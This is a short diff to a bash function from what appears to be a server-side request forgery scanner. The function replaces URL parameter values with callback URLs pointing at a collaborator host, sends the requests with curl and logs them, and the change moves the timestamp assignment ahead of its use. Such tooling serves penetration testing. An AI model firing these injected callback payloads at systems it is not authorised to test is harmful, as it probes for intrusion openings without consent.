@@ -107,11 +107,11 @@ inject_url_parameters() {
     # Extract key and value
     key=$(echo "$param" | cut -d'=' -f1)
     value=$(echo "$param" | cut -d'=' -f2)
+    current_time=$(date +"%H:%M:%S")
     # Construct new URL with the parameter injected
     new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s|$key=$value|$key=http://$Collab/?vulnerable_url=$base_url%26vulnerable_param=$key%26time=$current_time|")"
     # Send the request
     curl -L "$new_url" &> /dev/null &
-    current_time=$(date +"%H:%M:%S")
     echo -e "${YELLOW}$current_time ${NC}- Sent request to: $new_url" | tee inject_url_parameters.log
     sleep $delay
   done
